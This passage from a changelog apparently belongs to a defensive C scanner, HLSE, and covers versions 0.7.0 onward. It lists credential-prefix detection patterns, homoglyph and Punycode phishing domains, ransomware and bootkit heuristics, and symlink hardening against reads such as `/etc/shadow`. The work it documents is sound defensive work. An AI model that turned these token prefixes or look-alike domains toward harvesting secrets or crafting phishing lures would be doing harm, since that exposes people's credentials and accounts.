  `fgets()` indefinitely (local DoS). Added a shared `hlse_open_system_file()`
  helper (`O_RDONLY|O_NONBLOCK` + `fstat` + `S_ISREG` + `fdopen`) and routed all
  seven reads through it. It intentionally does NOT use `O_NOFOLLOW`: these are
  fixed root-owned paths that may legitimately be symlinks (e.g.
  `/etc/resolv.conf` on systemd), so following them is correct; `O_NOFOLLOW`
  stays reserved for untrusted directory-scan entries.
- **Ransomware-scan read path** (`read_file_head` in `hlse_protect.c`) now adds
  `O_NONBLOCK` + `fstat`/`S_ISREG` (keeping its `O_NOFOLLOW`), so a FIFO in a
  scanned tree can no longer block the reader.

### Changed
- `read_file_head`/MBR bootkit scan now use `unsigned char` buffers, avoiding an
  implementation-defined signed-char conversion of binary (>127) bytes.
- Damerau-Levenshtein transposition uses the canonical `+1` cost (behaviour-
  identical to the previous `+cost`, which only differed when all four
  characters matched — a case the substitution path already optimised).
- `--quiet` `freopen("/dev/null")` failure is now surfaced (exit 2) instead of
  silently continuing, honouring the quiet-mode contract.

### Tests
- `util_tests` 14 → 18: the new `hlse_open_system_file()` helper is covered for
  a regular file (opens), a FIFO (rejected without blocking), a directory
  (rejected), and a missing/NULL path (rejected, no crash).

### Notes
- Several agent-reported "buffer overflows" were verified FALSE and left
  unchanged: `hlse_file.c:399` (signed `ssize_t` under a `head_len > 100`
  guard), the email `reasons[]` array (max 7 reasons ≤ bound 8), and
  `extract_domain` output (zero-initialised at declaration). No detection
  logic changed; F1=1.000 (in/out-of-distribution) and ASan/UBSan stay clean.

## [0.9.34] — 2026-06-08

### Added
- **Discord webhook URL detection (34 → 36 patterns)**. The scanner already
  caught Slack webhook URLs; Discord webhooks (`discord.com/api/webhooks/<id>`
  and `discordapp.com/api/webhooks/<id>`) are among the most commonly leaked
  and were missing. Numeric-ID anchored after the fixed URL path, so false
  positives are negligible. F1=1.000 unaffected; secrets suite 33 → 34. This
  completes the credential-coverage work begun in 0.9.32 — 36 patterns now
  span the major cloud, SaaS, LLM, package-registry, and webhook providers.

## [0.9.33] — 2026-06-08

### Added
- **9 more credential patterns (25 → 34)**, a second peer-parity batch
  continuing the gitleaks/TruffleHog gap analysis. All distinctive, low-FP
  prefixes:
  - Hugging Face (`hf_` + 34 letters — letters-only body to avoid colliding
    with `hf_`-prefixed code identifiers)
  - PyPI Upload Token (`pypi-AgEIcHlwaS5vcmc…` — 20-char fixed marker, ~zero FP)
  - Postman (`PMAK-`), Square (`sq0atp-`), Doppler (`dp.pt.`),
    Grafana (`glsa_`), Linear (`lin_api_`), New Relic (`NRAK-`),
    Databricks (`dapi`)
  Still confined to `hlse_secrets.c`; **F1=1.000 re-verified** in- and
  out-of-distribution. Scanning HLSE's own source tree confirmed the new
  prefixes contribute zero false positives. Added a table-driven detection
  test and extended the prose false-positive guard (secrets suite 32 → 33).

## [0.9.32] — 2026-06-08

### Added
- **11 new credential patterns in the secret scanner** (14 → 25), closing the
  coverage gap against peer scanners (gitleaks/TruffleHog/detect-secrets) found
  in a competitive review. All additions are high-confidence, distinctive-prefix
  tokens with negligible false-positive risk:
  - Google API Key (`AIza` + 35)
  - GitLab Personal Access Token (`glpat-` + 20)
  - npm Access Token (`npm_` + 36)
  - OpenAI Project Key (`sk-proj-`) and Anthropic API Key (`sk-ant-`)
  - Shopify Access Token / Shared Secret / Private App (`shpat_`/`shpss_`/`shppa_` + 32 hex)
  - Stripe Restricted Key (`rk_live_`)
  - AWS Temporary/STS Access Key (`ASIA` + 16)
  - GitHub Refresh Token (`ghr_` + 36)
  These live entirely in `hlse_secrets.c` and are orthogonal to the URL/text
  detection corpus, so **F1=1.000 is unaffected** (verified in- and
  out-of-distribution). The placeholder/example exclusion still applies to all
  new patterns.
- **7 new secrets behavioral tests** (suite 25 → 32), including a prose
  false-positive guard asserting that prefix-sharing words (`npm_config`,
  `Asian`, `glpat`, `shppa`) in ordinary text produce zero findings.

## [0.9.31] — 2026-06-08

### Fixed
- **`examples/pre-commit-hook.sh` used wrong subcommand for secret detection**:
  the "Secret scan" section called `hlse_core text "$line"` (the scam-text
  pattern scanner) rather than `hlse_core secret` (the credential-pattern
  scanner `hlse_scan_secrets`). The `text` subcommand looks for urgency,
  financial bait, and authority signals — it does not match API keys, tokens,
  or `.env`-style secrets. A staged file containing `AWS_SECRET_ACCESS_KEY=…`
  or a GitHub PAT would pass the hook silently. Replaced the per-line `text`
  loop with a single `secret --stdin < "$file"` call using `--quiet` for
  the exit-code check, then re-running without `--quiet` to surface the
  finding detail. The fix also removes 5 lines of unnecessary shell loop.

## [0.9.30] — 2026-06-08

### Fixed
- **README "Test architecture" table had stale CLI integration count: 87 → 90**
  (docs). The table was last updated in GAP-J (0.9.12, 45→86) but three more
  tests were added since: two for GAP-Q (secret/email no-arg exit=2 regression,
  0.9.19) and one for GAP-R (SARIF relative-URI regression, 0.9.20). Updated
  count to 90 and added "SARIF relative URIs, no-arg exit=2" to the row's
  description. Docs-only — no code or detection change.

## [0.9.29] — 2026-06-08

### Fixed
- **`hlse_audit.c:240` for-loop accessed array index before bounds check**
  (code quality). The hosts-file scan lowercased an input string with
  `for (k = 0; p[k] && k < sizeof(lower) - 1; k++)`, testing `p[k]` before the
  bounds check on the output buffer. Although functionally correct (reading `p`
  never overflows; the bound check is on the output `lower`), cppcheck
  `--enable=portability` flagged it as `arrayIndexThenCheck`. Reordered to
  `k < sizeof(lower) - 1 && p[k]` to match the conventional bounds-first
  pattern. Zero behaviour change; cppcheck warning eliminated.

## [0.9.28] — 2026-06-08

### Fixed
- **Property test file header listed only P1–P7; implementation tests P1–P13**
  (docs; GAP-Z). When P8–P13 (HTML entity, zero-width Unicode, l33tspeak,
  Cyrillic/Greek homoglyph, combined, and full-width evasion) were added to
  `tests/hlse_property_tests.c`, the file's own header comment was not updated.
  A reader of the test file saw only 7 properties listed even though the suite
  enforces 13. Updated the file header to enumerate all 13 (now consistent with
  spec §4.1 added in 0.9.27). Docs-only — no code or detection change.

## [0.9.27] — 2026-06-08

### Fixed
- **Spec §4 did not enumerate the 13 text-detection property invariants**
  (docs; GAP-Y). Spec §7 stated `make test` runs "all suites + property + corpus +
  CLI integration" but never named what the property suite verifies. Added §4.1
  "Text-detection property invariants (P1–P13)" — a table listing all 13 formal
  guarantees (score monotonicity, bounds, determinism, case insensitivity,
  whitespace/HTML entity/zero-width/l33tspeak/Cyrillic/full-width evasion
  resistance, combined evasion, multilingual parity, and safe-corpus FP ≤ 5%).
  A spec reader can now verify what "property tests pass" means without reading
  the test source. Docs-only — no code or detection change.

## [0.9.26] — 2026-06-08

### Fixed
- **CONTRIBUTING.md carried stale test counts and an incomplete test-axis
  table** (docs; GAP-X). Three errors corrected:
  - "200+ tests" → "320+" (matches current measured total)
  - "All 7 suites" → "All 8 suites" (util_tests added in 0.9.12)
  - "100K random inputs" → "4 harnesses × 100K iterations" (matches GAP-I)
  The "Six-axis" section was retitled "Seven-axis" and the table extended
  from 4 rows to 7 to include Behavioral tests, CLI integration, and Fuzz
  harnesses — all of which previously had no guidance on when to add a test.
  Docs-only — no code or detection change.

## [0.9.25] — 2026-06-08

### Fixed
- **Spec §3.1 subcommand table listed wrong library function for `text`**
  (docs; SPECIFICATION.md §3.1, GAP-W). The table said `hlse_check_text`
  but the `text` subcommand was updated to call `hlse_scan()` in 0.9.15
  (GAP-N) to add embedded URL extraction. The table and purpose description
  are now aligned with the implementation. Docs-only — no code change.

## [0.9.24] — 2026-06-08

### Fixed
- **Spec §5.2 omitted the `scan_summary` terminator record** (docs + test;
  SPECIFICATION.md §5.2, GAP-V). `scan --json` emits a final
  `{"kind":"scan_summary","target":"...","files_scanned":N,"threats":N}`
  line after all per-finding records. Spec §5.2 mentioned streaming
  `scan` records but said nothing about the terminator. Documented it;
  also tightened the existing `--json scan with summary line` regression
  test to assert the `target` field.

## [0.9.23] — 2026-06-08

### Fixed
- **Spec §5.2 omitted the `target` field for `url`, `text`, and `protect`
  JSON output** (docs; SPECIFICATION.md §5.2, GAP-U). A strict per-kind
  audit (no implicit fields) revealed that `url`, `text`, and `protect` all
  emit a `target` string (scanned URL / text string / directory path) that
  was never mentioned in §5.2. The field is useful to consumers — it
  disambiguates which record belongs to which scan — so it is documented
  rather than removed. §5.2 is split to list `url`, `text`, and `protect`
  separately with their `target` fields; `network`, `esp`, and `email` (no
  `target`) remain grouped. Docs-only — no code or detection change.

## [0.9.22] — 2026-06-08

### Fixed
- **Spec §5.2 omitted the `paste` JSON `signals` field** (docs;
  SPECIFICATION.md §5.2, GAP-T). The `paste` kind emits an integer `signals`
  field (count of fired pastejacking signals) alongside `reasons`, but the
  §5.2 field inventory documented only `reasons`. Documented `signals` for
  consistency with `audit` (whose extra `hardening_index` integer is already
  documented). Audited all twelve `--json` kinds against §5.2; the other
  eleven match their inventories exactly. Docs-only — no code or detection
  change.

## [0.9.21] — 2026-06-08

### Added
- **CI workflows** (`.github/workflows/ci.yml`, `.github/workflows/codeql.yml`).
  The README claimed "CI enforces this with a privacy tripwire job" but no
  workflow files existed. Created:
  - `ci.yml`: three jobs — `build-and-test` (make all + test + check-warnings +
    asan-test), `cppcheck` (error gate with `--error-exitcode=1` + advisory-only
    informational run), and `privacy-tripwire` (strace captures URL/text/secret/
    package subcommands and asserts zero `socket()/connect()/bind()` syscalls).
  - `codeql.yml`: GitHub CodeQL C/C++ analysis with `security-and-quality`
    queries on push/PR to main plus weekly schedule.
  Both workflows target `main` and `claude/**` branches.

## [0.9.20] — 2026-06-08

### Fixed
- **SARIF `artifactLocation.uri` emitted absolute paths** (`hlse_core.c`
  `sarif_emit()`; SPECIFICATION.md §5.3). The `scan` subcommand's SARIF output
  used the full absolute `fullpath` as the URI value (e.g.
  `/repo/src/file.py`). GitHub code scanning and the SARIF standard require
  relative URIs (relative to the checkout root) so the tool can map findings
  back to source files. Fixed by stripping the scan root prefix from each path
  before passing it to `sarif_add()`, yielding URIs like `src/file.py`.
  Added regression test `SARIF: artifactLocation URIs are relative`
  (CLI integration suite now has 90 tests).

## [0.9.19] — 2026-06-08

### Fixed
- **`secret` and `email` subcommands returned exit=0 when invoked with no
  argument in non-interactive (CI/script) environments** (`hlse_core.c`;
  SPECIFICATION.md §3). Both subcommands used `!isatty(0)` to fall through to
  stdin reading when no argument was provided. In CI pipelines, stdin is not a
  tty even without a pipe, so they silently scanned empty input and exited
  clean. Fixed by requiring either an explicit text argument or the explicit
  `--stdin` flag; no argument at all now returns exit=2 with a usage error,
  consistent with `text`, `scan`, `protect`, `file`, and `package`.
- Added regression tests: `secret: no-arg exits 2` and `email: no-arg exits 2`
  (CLI integration suite now has 89 tests).

## [0.9.18] — 2026-06-08

### Fixed
- **`scan --json` `secret` records used `reasons` schema instead of
  `findings`** (`hlse_core.c` scan walker; SPECIFICATION.md §5.2, GAP-P).
  The spec §5.2 defines `kind=secret` as carrying
  `findings:[{type,description}]`. The standalone `secret` subcommand
  already emitted the correct structured schema; however the `scan` walker's
  JSON branch emitted a flat `reasons:["description string", ...]` array
  instead. Fixed the scan walker to emit
  `findings:[{"type":"...","description":"..."}]` objects, making all
  `kind=secret` records consistent across both code paths.

## [0.9.17] — 2026-06-08

### Fixed
- **SARIF rule definitions missing `security-severity`** (`hlse_core.c`
  `sarif_emit()`; SPECIFICATION.md §5.3, GAP-O). The SARIF output had
  `security-severity` on individual result objects but not on rule
  definitions, which GitHub code scanning requires to classify vulnerability
  severity. Added `"properties": { "security-severity": "X.X" }` to each
  rule (`secret`=9.0, `file-masquerade`=8.0, `phishing-url`=7.5). Also
  improved rule `shortDescription` text from the generic "HLSE X detector"
  to human-readable descriptions.

- **`scan --json` `url` records missing `reasons` field** (`hlse_core.c`
  scan walker; SPECIFICATION.md §5.2, GAP-O companion). When the `scan`
  directory walker found a phishing URL embedded in a source file, the
  human-readable output included the reason strings but the `--json` URL
  record did not emit `"reasons"`. Fixed to match the spec §5.2 requirement
  that `url` JSON objects carry `reasons:[...]`.

## [0.9.16] — 2026-06-08

### Fixed
- **`--stdin --json` dropped embedded URL scores** (`hlse_core.c`
  `stdin_mode()`; companion to GAP-N). The `--stdin --json` path had the
  identical bug as the `text`/auto-detect JSON paths fixed in 0.9.15:
  `hlse_check_text(line)` was called instead of reusing the `ScanResult`
  already computed by `hlse_scan(line)`, so text lines with embedded
  phishing URLs returned score=0 in JSON mode while human output showed
  the correct BLOCK.

### Changed
- **README docs**: property table corrected `P1–P12` → `P1–P13` (P13
  full-width Unicode evasion was already implemented and passing); CLI
  integration count updated 86 → 87.

## [0.9.15] — 2026-06-08

### Fixed
- **`--json text` dropped embedded URL scores** (`hlse_core.c`;
  SPECIFICATION.md §8, GAP-N). When a text message contained an embedded
  phishing URL (e.g. `"click https://paypa1.com/signin"`), the human-readable
  path called `hlse_scan()` (embedded URL extraction → score 60) but the
  `--json` path re-called `hlse_check_text()` alone, returning score 0 for
  the same input. Same flaw in the auto-detect JSON path. Both paths now
  reuse the `ScanResult` already computed by `hlse_scan()` to build the
  `TextVerdict` for JSON output. Regression guard added to CLI integration
  (now 87 tests). Man page `.TH` header version/date also updated.

- **Man page version frozen at 0.9.0** (`hlse.1`; SPECIFICATION.md §8,
  GAP-M). `.TH` header still read `"HLSE 0.9.0"` / `"2026-05-31"`, and the
  OPTIONS section omitted `-h | --help`. Updated header to `0.9.15` /
  `2026-06-08` and added the missing option entry.

## [0.9.14] — 2026-06-08

### Fixed
- **`-h | --help` absent from help output** (`hlse_core.c` `print_usage()`;
  SPECIFICATION.md §8, GAP-L). Spec §3.2 lists `-h`, `--help` as a global
  flag; all other 7 flags appeared in the "Options" block but `--help` did
  not self-reference. Added `%s -h | --help  Show this help` as the final
  option line (1 `printf` arg added; arg count in comment updated to 8).

## [0.9.13] — 2026-06-08

### Fixed
- **README C library API accuracy** (SPECIFICATION.md §8, GAP-K). The README
  claimed "29 functions exported in `libhlse.so`" but `nm -D libhlse.so`
  reports 35 (six additions since the original count: `hlse_esp_verify`,
  `hlse_audit_hardening_index`, `hlse_validate_crypto_address`,
  `hlse_is_high_entropy_benign_magic`, `hlse_shannon_entropy_str`,
  `hlse_text_action_for_score`). The code example also omitted `hlse_util.h`
  and six entry points (`scan_secrets`, `check_email_headers`,
  `check_crypto_swap`, `esp_verify`, `audit_hardening_index`, `validate_crypto`).
  The "All pure functions, thread-safe" note was inaccurate — filesystem/host
  functions (protect/audit/network) are process-level. Updated count to 35,
  added missing examples, corrected thread-safety note. Also updated spec §7
  fuzz description from `100K` to `4 × 100K`. Docs-only.

## [0.9.12] — 2026-06-08

### Fixed
- **README test-architecture accuracy** (SPECIFICATION.md §8, GAP-J). The
  per-suite counts in the "Test architecture" table had drifted from reality
  (Unit-URL 13→23, Unit-text 14→15, Property 60→64, Secrets 20→25,
  File/Audit 14→17, CLI integration 45→86), and the `util_tests` (14) and
  out-of-distribution corpus (25) suites were missing entirely. The Fuzz row
  predated GAP-I (one text harness → four). Refreshed all rows to measured
  counts, added the two missing suites, and updated the Fuzz row to `4 × 100K`.
  The at-a-glance `320+` floor was re-verified and still holds (≈339
  suite/corpus + in-distribution benchmark checks). Docs-only.

## [0.9.11] — 2026-06-08

### Added
- **Multi-module fuzz harnesses** (`tests/hlse_secrets_fuzz.c`,
  `tests/hlse_supply_fuzz.c`, `tests/hlse_file_fuzz.c`;
  SPECIFICATION.md §8, GAP-I). Previously `make fuzz` / `make fuzz-asan`
  covered only `hlse_text.c`; the five other parser modules had zero fuzz
  coverage. Three portable smoke-fuzz harnesses added — same pattern as the
  original: deterministic PRNG, signal-handler crash detection, score-range
  assertion, 100K iterations (10K under ASan):
  - `hlse_secrets_fuzz.c` — `hlse_scan_secrets`, `hlse_check_email_headers`,
    `hlse_check_crypto_swap`, `hlse_validate_crypto_address` (4 entry points;
    generators: random bytes, credential fragments, email headers, crypto addresses)
  - `hlse_supply_fuzz.c` — `hlse_check_package`, `hlse_check_paste`
    (generators: random bytes, typosquat-mutated names, pastejacking commands)
  - `hlse_file_fuzz.c` — `hlse_check_filename` (disk-free path; generators:
    random bytes, double-extension, bidi/control characters, social-engineering lures)
- `make fuzz` now runs all four harnesses sequentially; `make fuzz-asan` runs
  all four under ASan/UBSan. `make clean` removes all harness binaries.

## [0.9.10] — 2026-06-06

### Fixed
- **README accuracy** (SPECIFICATION.md §8, GAP-H). "Structured tests: 237" and
  "Binary size: 53 KB (dynamic), 932 KB (static)" had drifted — actual is ≈328
  checks across the suites + CLI integration, and ≈140 KB dynamic / ≈1.0 MB
  static-pie (stripped) after the feature and hardening work. Updated to a
  non-drifting `320+` and measured approximate sizes; dropped the brittle exact
  count from the `make test` comment. The detection/evasion examples, F1=1.000,
  and 0% FP claims were re-verified and are accurate.

## [0.9.9] — 2026-06-06

### Changed
- **Consistent JSON `action` band** (`hlse_core.c`; SPECIFICATION.md §5.2,
  GAP-G). Only 4 of 12 `--json` kinds (`url`, `text`, `protect`, `esp`) emitted
  the `action` band; the other 8 (`package`, `paste`, `network`, `secret`,
  `email`, `clipboard`, `audit`, `file`) plus the streaming `scan` records
  omitted it, forcing consumers to re-derive the band from `score`. Every
  score-bearing JSON object now carries `"action"` (from
  `hlse_action_for_score`). 10 CLI action-consistency tests added.

## [0.9.8] — 2026-06-06

### Fixed
- **Solana clipboard-swap detection** (`hlse_secrets.c`; SPECIFICATION.md §8,
  GAP-F). The header advertised crypto-swap support for "BTC, ETH, XMR, SOL,
  USDT" and the `CRYPTO_SOL` enum / `"SOL (Solana)"` name existed, but
  `detect_crypto_type()` had no Solana branch, so a Solana clipper swap was
  silently never flagged. Add a base58 32–44 Solana branch, evaluated last so
  the prefixed/fixed-length formats (BTC `1`/`3`, USDT `T`, ETH `0x`, …) keep
  precedence. Detection is confined to the clipboard-swap comparison and the
  (test-only) validator — it does not feed the URL/text path, so phishing/scam
  F1 is unaffected. Adds validate + swap regression tests.

## [0.9.7] — 2026-06-06

### Security
- **`scan` no longer follows symlinks** (`hlse_core.c`; SPECIFICATION.md §1,
  GAP-E). A second spec audit found the recursive directory walker classified
  entries with `stat()` (follows links) and read files with `fopen()` (no
  `O_NOFOLLOW`). A symlinked directory could make the scan escape the target
  tree (and risk symlink cycles); a symlinked file such as `x.env ->
  /etc/shadow` was opened and scanned for secrets, disclosing a file outside
  the scanned tree. Now classified with `lstat()` (symlinks become `S_ISLNK`
  and are skipped) and re-opened with `O_NOFOLLOW | O_NONBLOCK` + `S_ISREG`
  (TOCTOU defence), matching the hardened pattern already used in
  `hlse_file.c`, `hlse_audit.c`, and the ESP scan. Real in-tree files are still
  scanned; a regression test plus an ASan symlink-cycle test were added.

## [0.9.6] — 2026-06-06

### Added
- **Formal specification** (`docs/SPECIFICATION.md`): the CLI contract, scoring
  model, per-module behaviour, output schemas, design invariants, and a gap
  analysis. Writing it surfaced that several documented/library capabilities had
  no CLI access — resolved below.
- **`secret` subcommand**: scan a text argument or stdin for leaked credentials
  (`hlse_scan_secrets`), previously reachable only via a directory `scan`.
- **`email` subcommand**: email-header forensics (`hlse_check_email_headers`) —
  SPF/DKIM, Reply-To mismatch, display-name/BEC spoofing. Arg or `--stdin`.
- **`clipboard` subcommand**: crypto address-swap / clipper detection
  (`hlse_check_crypto_swap`, including the 0.9.3 vanity look-alike escalation),
  previously library-only.
- All three honour `--json`; `esp` (added in 0.9.4) plus the three new commands
  are now documented in `--help`/`print_usage`, the man page, and the README.

### Notes
- These are thin CLI wrappers over existing, tested library functions — no
  detection logic changed. 14 new CLI integration tests; ASan/UBSan clean
  (empty/large/binary stdin); strict warnings + cppcheck clean.

## [0.9.5] — 2026-06-05

### Added
- **Lynis-style hardening index** (`hlse_audit.c`): new
  `hlse_audit_hardening_index()` returns a 0..100 score where 100 = fully
  hardened (the complementary view of the finding-weighted risk score). The
  `audit` subcommand now prints `Hardening index: N/100 (hardened|good|fair|
  weak)` and exposes `hardening_index` / `hardening_band` in `--json audit`,
  giving the same at-a-glance posture signal Lynis provides. Stateless helper;
  no detection logic changed. (Research backlog #7.)

## [0.9.4] — 2026-06-05

### Added
- **EFI System Partition (ESP) integrity check** (`hlse_protect.c`, new `esp`
  subcommand): `hlse_esp_verify` walks the ESP (default `/boot/efi`) and flags
  `.efi` binaries containing high-specificity ransom/bootkit text. The legacy
  MBR check only covers BIOS boot; the live boot-level threat is UEFI bootkits
  (BlackLotus, Linux Bootkitty) that tamper with the ESP. Unlike the MBR scan,
  this uses only multi-word ransom-note phrases (`"all your files have been
  encrypted"`, `"pay bitcoin"`, …) — the MBR's generic single-word tokens
  (`decrypt`, `locked`) would false-positive inside legitimate multi-MB signed
  bootloaders. Read-only, never follows symlinks, depth- and count-bounded.
  `--json esp` supported. 6 CLI regression cases added.

### Notes
- ESP signature (Authenticode) validation is intentionally deferred: it cannot
  be done safely offline without a baseline, and a wrong implementation would
  risk false negatives. See `docs/RESEARCH_IMPROVEMENTS.md` #8.

## [0.9.3] — 2026-06-05

### Added
- **Clipboard clipper "vanity look-alike" signal** (`hlse_secrets.c`): when a
  same-type crypto address is swapped, `hlse_check_crypto_swap` now measures the
  shared leading/trailing characters between the original and the replacement.
  Real clipboard hijackers (per EthClipper, arXiv 2108.14004) grind a
  replacement that shares the victim address's ends so a glance misses the
  swap; a shared tail of 4+ chars between two *different* addresses is
  essentially impossible by chance. Such swaps now escalate from BLOCK (95) to
  ISOLATE (100) with an explanatory reason. Purely additive — detection is never
  weakened; addresses with no shared ends keep their existing score.

## [0.9.2] — 2026-06-05

### Added
- **IDN homograph detection via Punycode** (`hlse_core.c`): `xn--` labels are
  now decoded per RFC 3492 and analysed UTS-39 style. Cyrillic/Greek/Armenian
  homographs delivered as Punycode (which is pure ASCII and so invisible to the
  existing UTF-8 mixed-script check) are caught: a confusable-folded label that
  resembles a brand, or a label mixing Latin with another script, is flagged.
  `xn--pple-43d` (аpple), `xn--ggle-55da` (gооgle), `xn--pypl-53dc` (pаypаl) and
  `xn--mirosoft-gch` (miсrosoft) now score BLOCK. Legitimate single-script IDNs
  — `xn--mnchen-3ya` (münchen), `xn--wgv71a` (日本), `xn--e1afmkfd` (пример) —
  are deliberately **not** flagged, preserving the 0.0% false-positive posture.
  Closes the largest detection gap identified in `docs/RESEARCH_IMPROVEMENTS.md`
  (item #1). Pure C, no network, no new dependencies.

### Changed
- 7 IDN regression cases added to the in-binary `--self-test`; in- and
  out-of-distribution corpora remain F1 = 1.000; ASan/UBSan clean (including
  malformed Punycode); strict warnings and cppcheck clean.

## [0.9.1] — 2026-06-04

Security-hardening release. No detection-logic changes: in- and
out-of-distribution corpora remain F1 = 1.000 and all 237+ tests pass.

### Security
- **Exploit-mitigation build flags** (`Makefile`): the binaries are now
  compiled with `-fstack-protector-strong` and `-D_FORTIFY_SOURCE=2`, and
  linked as PIE with Full RELRO, `BIND_NOW`, and a non-executable stack on
  Linux (`-static-pie` for the static target). Previously the security
  tool itself shipped with no hardening (`-O2 -Wall -Wextra`, empty
  `LDFLAGS`). macOS builds are unaffected (uname-guarded linker flags).
- **Symlink / special-file safety** (`hlse_file.c`, `hlse_audit.c`): file
  reads now use `O_NOFOLLOW | O_NONBLOCK` and require `S_ISREG` via
  `fstat()`. A symlink can no longer redirect a scan to an arbitrary file
  (e.g. `/etc/shadow`) and a FIFO/device node can no longer block the
  scanner. Brings both modules in line with `hlse_protect.c`.

### Changed
- **Bounded string construction** (`hlse_core.c`): replaced an unbounded
  `strcpy`/`strcat` pair in the homoglyph `ii→ll` path and the default
  path assignment with clamped `memcpy`/explicit writes. Behaviour is
  unchanged; removes latent overflow hazards.
- **DRY** (`hlse_util.c`): the benign high-entropy magic-byte table
  (ZIP/GZIP/JPEG/PNG/…) used by the ransomware entropy heuristic moved
  into a shared `hlse_is_high_entropy_benign_magic()`.
- **`hlse_scan` reason copy** (`hlse_core.c`): bound the copy loop by the
  source `Verdict.reasons` size instead of a mismatched literal.

### Added
- **Static analysis config** (`.clang-tidy`): a bugprone/cert/
  clang-analyzer check set for local runs
  (`clang-tidy hlse_*.c -- -I. -std=c99 ...`). Companion CI jobs — a
  cppcheck `error`-severity gate (with documented inline suppressions)
  and a CodeQL `security-and-quality` workflow for C — plus a
  `release.yml` version-gate fix are maintained alongside the
  repository's GitHub Actions workflows.
- **cppcheck-driven fixes** (`hlse_core.c`): bound the `hlse_scan`
  reason copy by the source `Verdict.reasons` size, and document a
  `legacyUninitvar` false positive with an inline suppression.

## [0.9.0] — 2026-05-31

### Added
- **DGA / high-entropy domain detection** (`hlse_core.c`): Shannon entropy
  + digit-ratio analysis flags algorithmically generated domains
  (`x7k2p9qzr4mw.com`). Grounded in published phishing-URL feature research;
  requires both high entropy and digit presence to avoid false positives on
  long brand names (stackoverflow, amazonwebservices).
- **Brand-hyphen phishing** — `paypal-verify.com`, `apple-support.net`
  flagged via brand + hyphen + security-word pattern.
- **Digraph homoglyph** — `arnazon.com` (rn→m), `vv→w` normalization.
- **New abused TLDs** — `.zip`, `.mov`, `.country`, and others added to the
  high-risk list.
- **BEC amplifiers** (`hlse_text.c`): authority+wire, secrecy+wire, and
  authority+secrecy+payment compound rules; expanded executive-title and
  secrecy phrasings. CEO-fraud messages now reach ISOLATE.
- **Full-width Unicode folding** — `ｕｒｇｅｎｔ` (U+FF01-FF5E) collapsed to
  ASCII before keyword matching.
- **Polyglot file detection** (`hlse_file.c`): image/archive magic bytes
  (GIF/JPEG/PNG/ZIP/GZIP) with an executable extension flagged as payload
  disguise.
- **Bidi-override filename detection** — U+202E (RLO), U+202D (LRO), and
  bidi isolates flagged independent of apparent extension; `file`
  subcommand now analyzes names even when the file is absent.
- **SARIF 2.1.0 output** — `--sarif scan <dir>` emits GitHub code-scanning
  compatible results with rule definitions and security-severity.
- **Shared utility module** (`hlse_util.c`): Shannon entropy and
  Damerau-Levenshtein consolidated from three duplicate copies (DRY).

### Changed
- **Secret scanner** now excludes placeholder/example/test keys
  (`AKIAIOSFODNN7EXAMPLE`, `your_api_key_here`, repetitive tokens),
  matching the false-positive reduction of gitleaks/TruffleHog without
  requiring network verification.
- **Ransomware entropy** check excludes known compressed/media formats by
  magic byte, eliminating false positives on directories of `.zip`/`.gz`/
  `.jpg` files (Shannon entropy cannot distinguish encrypted from
  compressed; magic-byte exclusion is the robust fix).
- `scan` now errors (exit 2) on a missing directory instead of reporting
  a clean result.

### Fixed
- Unterminated HTML entities (`U&#82GENT` without semicolon) now decoded
  like browsers do.
- CI workflow rebuilt to run the full test suite, strict warnings,
  sanitizers, fuzzing, coverage gate, and gitleaks (previously only ran a
  subset and referenced a nonexistent test file).

### Security
- Added `release.yml` that re-runs all gates before producing signed
  release artifacts; a release can no longer bypass CI.

## [0.8.0] — 2026-05-12

### Added
- **Protection module** (`hlse_protect.c`): 4 behavioral detection layers
  - Ransomware: Shannon entropy analysis, ransom note detection (14
    filenames), extension mutation (26 extensions), compound rules
  - Network drive: /proc/mounts CIFS/NFS detection, lateral movement amplifier
  - SMB server: canary honeypot files, Samba audit log analysis
  - MBR/GPT: boot signature check, first-instruction validation,
    bootkit string scan, boot code entropy analysis
- **Secrets module** (`hlse_secrets.c`): 3 detection layers
  - Credential scanner: AWS keys, GitHub PATs, Stripe keys, Slack tokens,
    SSH private keys, .env passwords, generic high-entropy secrets
  - Email header forensics: display-name vs From mismatch, Reply-To
    mismatch, SPF/DKIM/DMARC fail, free-email corporate impersonation
  - Clipboard crypto-swap: BTC/ETH/XMR/SOL/USDT address validation +
    swap detection
- Unified `hlse_scan` API — auto-detects URL vs text, runs both detectors
- `hlse_core.h` public header with ScanResult, Verdict types
- Apple-style zero-argument demo (`./hlse_core` with no args)
- `--version` / `-V` flag
- Empty input → meaningful error ("Nothing to scan")
- `protect` CLI subcommand with auto-detect (dir→ransomware, /dev/→MBR)
- JSON output for protect subcommand
- 14 protection tests + 20 secrets tests integrated into `make test`

### Changed
- `check_url` made static (internal only); `hlse_check_url` is the public API
- Library exports unified to `hlse_` prefix (19 symbols, no namespace pollution)
- `stdin_mode` rewritten to use `hlse_scan` (eliminated duplicate URL/text branching)
- Progressive disclosure: safe → 1 line, threat → detailed reasons

### Fixed
- Format-truncation warnings in hlse_secrets.c (display_name overflow)
- `memmem()` replaced with portable `memcmp` loop (macOS/musl compat)
- `system("rm -rf")` in tests replaced with `opendir/unlink/rmdir`
- Block comment terminated early by `/dev/*` glob in comment
- Stale build artifacts removed from outputs/

## [0.7.0] — 2026-04-29

First production release of the C reference implementation.

### Added
- 12 URL detectors (homoglyph, mixed-script, typosquat, suspicious TLD, etc.)
- 10 text signals + 4 amplifiers, multilingual EN/JP/ZH/KR
- JSON output, stdin pipe mode, text mode
- 45 property tests across 7 axes
- 18 + 18 corpus benchmark, F1=1.000
- libhlse.so shared library (~22 KB) for FFI
- Static binary build (~742 KB stripped)
- GitHub Actions CI: Linux+macOS × GCC+Clang
- Privacy tripwire CI job blocking network calls

### Bug fixes (TDD-driven discovery)

These bugs slipped through unit tests but were caught by property tests
or the corpus benchmark:

- **CONFUSABLES collision**: `paypa1.com` not detected because `('1','i')`
  came after `('1','l')`. Fixed: keep only `('1','l')`, expand digits.
- **Capital-I homoglyph**: `paypaII.com` undetected, str_tolower stripped
  the signal. Fixed: II→ll alternative form check.
- **Cyrillic homoglyph**: `mіcrosoft.com` undetected. Fixed: UTF-8 byte
  mapping for Cyrillic→ASCII collapse.
- **Wikipedia false positive**: `/wiki/Verify` flagged. Fixed: trusted-host
  allowlist requires ≥3 phishing-path matches.
- **Double counting**: `paypa1.com` scored 95 (homoglyph 45 + typosquat 50).
  Fixed: typosquat skips when homoglyph already fired.
- **str_to_lower mangled UTF-8**: applied tolower to high bytes. Fixed:
  ASCII bytes only (`< 0x80`).
- **normalize_whitespace mangled multibyte**: continuation bytes treated
